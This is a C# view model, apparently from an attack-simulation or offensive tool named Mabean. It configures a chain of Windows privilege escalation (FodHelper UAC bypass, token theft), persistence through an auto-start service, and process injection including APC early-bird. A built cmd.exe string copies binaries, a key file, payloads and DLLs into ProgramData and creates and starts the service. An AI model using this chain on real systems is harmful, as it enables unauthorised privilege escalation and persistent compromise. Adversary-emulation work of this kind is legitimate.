using Avalonia.Controls.Shapes;
using CommunityToolkit.Mvvm.ComponentModel;
using CommunityToolkit.Mvvm.Input;
using Mabean.Helpers;
using Mabean.Models;
using Mabean.Services;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Threading.Tasks;

namespace Mabean.ViewModels;

public partial class BehaviorChainViewModel : ViewModelBase
{
    private readonly PayloadService _payloadService;
    private readonly ChainBehaviorService _chainBehaviorService;

    private string DefaultServiceBinaryPath = Paths.ServiceBinaryPath;
    string destExe = @"C:\ProgramData\Mabean\3.exe";

    [ObservableProperty]
    [NotifyPropertyChangedFor(nameof(ShowPrivEscFields), nameof(ShowPrivEscPidField))]
    private bool _privEscEnabled;

    [ObservableProperty]
    [NotifyPropertyChangedFor(nameof(ShowPrivEscPidField))]
    private string _privEscBehavior = "FodHelperAbuse";

    [ObservableProperty] private uint _privEscTargetPid;

    [ObservableProperty]
    [NotifyPropertyChangedFor(nameof(ShowPersistenceFields), nameof(ShowPersistenceBinaryPathField))]
    private bool _persistenceEnabled;

    public const string ServiceName = "MabeanService";

    [ObservableProperty] private string _persistenceBehavior = "ServiceInstall";

    [ObservableProperty]
    [NotifyPropertyChangedFor(nameof(ShowPersistenceBinaryPathField))]
    private bool _persistenceUseDefaultPath = true;

    [ObservableProperty] private string _persistenceBinaryPath = string.Empty;

    [ObservableProperty]
    [NotifyPropertyChangedFor(nameof(ShowInjectionFields), nameof(ShowInjectionPidField), nameof(ShowInjectionProgramField))]
    private bool _injectionEnabled;

    [ObservableProperty]
    [NotifyPropertyChangedFor(nameof(ShowInjectionPidField), nameof(ShowInjectionProgramField))]
    private string _injectionBehavior = "Simple";

    [ObservableProperty] private uint _injectionTargetPid;
    [ObservableProperty] private string _injectionProgramName = string.Empty;
    [ObservableProperty] private string _injectionPayloadName = string.Empty;

    public bool ShowPrivEscFields => PrivEscEnabled;
    public bool ShowPrivEscPidField => PrivEscEnabled && PrivEscBehavior == "TokenTheft";
    public bool ShowPersistenceFields => PersistenceEnabled;
    public bool ShowPersistenceBinaryPathField => PersistenceEnabled && !PersistenceUseDefaultPath;
    public bool ShowInjectionFields => InjectionEnabled;
    public bool ShowInjectionPidField => InjectionEnabled && InjectionBehavior != "Apc-EarlyBird";
    public bool ShowInjectionProgramField => InjectionEnabled && InjectionBehavior == "Apc-EarlyBird";

    public IReadOnlyList<string> PrivEscBehaviors { get; } = ["FodHelperAbuse"];
    public IReadOnlyList<string> PersistenceBehaviors { get; } = ["ServiceInstall"];
    public IReadOnlyList<string> InjectionBehaviors { get; } = ["Simple"];

    private ObservableCollection<string> _payloads = [];
    public ObservableCollection<string> Payloads
    {
        get => _payloads;
        private set => SetProperty(ref _payloads, value);
    }

    public IAsyncRelayCommand RunChainCommand { get; }

    public BehaviorChainViewModel(PayloadService payloadService, ChainBehaviorService chainBehaviorService)
    {
        _payloadService = payloadService;
        _chainBehaviorService = chainBehaviorService;
        RunChainCommand = new AsyncRelayCommand(RunChain);
        _ = LoadPayloads();
    }

    private async Task LoadPayloads()
    {
        var payloads = await _payloadService.GetPayloads();
        if (payloads != null)
            Payloads = new ObservableCollection<string>(payloads);
    }

    private string BuildFodHelperCommand(string resolvedBinaryPath) =>
        $@"cmd.exe /c " +
        $@"mkdir C:\ProgramData\Mabean 2>nul & " + 
        $@"copy /Y ""{resolvedBinaryPath}"" ""{destExe}"" && " +
        $@"copy /Y ""{Paths.KeyBinPath}"" ""C:\ProgramData\Mabean\key.bin"" && "  + 
        $@"robocopy ""{Paths.PayloadsDir}"" ""C:\ProgramData\Mabean\Payloads"" /E & " +
        $@"robocopy ""{Paths.SessionConfigDir}"" ""C:\ProgramData\Mabean\SessionConfig"" /E & " +
        $@"robocopy ""{Paths.Dlls}"" ""C:\ProgramData\Mabean\Dlls"" /E & " +
        $@"sc create {ServiceName} binPath= ""{destExe}"" start= auto && " +
        $@"sc start {ServiceName}";

    private async Task RunChain()
    {
        var resolvedBinaryPath = PersistenceUseDefaultPath ? DefaultServiceBinaryPath : PersistenceBinaryPath;
        Console.WriteLine($"Resolved binary path for persistence: {resolvedBinaryPath}");
        var fodHelperCommand = BuildFodHelperCommand(resolvedBinaryPath);

        var definition = new BehaviorChainDefinition
        {
            PrivEsc = PrivEscEnabled ? new PrivEscStep
            {
                Behavior = PrivEscBehavior, 
                TargetPid = PrivEscBehavior == "TokenTheft" ? PrivEscTargetPid : null,
                ExecPath = PrivEscBehavior == "FodHelperAbuse" ? fodHelperCommand : null
            } : null,

            Persistence = PersistenceEnabled ? new PersistenceStep
            {
                Behavior = PersistenceBehavior,
                ServiceName = ServiceName,
                BinaryPath = resolvedBinaryPath
            } : null,

            Injection = InjectionEnabled ? new InjectionStep
            {
                Behavior = InjectionBehavior,
                TargetPid = InjectionBehavior != "Apc-EarlyBird" ? InjectionTargetPid : null,
                ProgramName = InjectionBehavior == "Apc-EarlyBird" ? InjectionProgramName : null,
                PayloadName = InjectionPayloadName
            } : null
        };

        await _chainBehaviorService.RunChainAsync(definition);
    }
}
